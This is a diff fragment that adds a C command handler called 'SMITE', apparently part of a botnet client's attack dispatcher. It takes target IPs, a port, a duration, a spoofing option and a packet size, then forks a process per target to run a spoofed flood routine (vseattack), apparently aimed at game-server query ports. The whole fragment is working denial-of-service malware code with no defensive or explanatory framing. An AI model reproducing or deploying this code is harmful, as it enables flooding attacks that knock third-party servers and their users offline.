@@ -1,0 +1,29 @@
+       if(!strcmp(argv[0], "SMITE")) {
+            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
+            return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = atoi(argv[4]);
+            int packetsize = atoi(argv[5]);
+            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
+            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
+            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                _exit(0);
+            }
+        }
+        return;
+        }
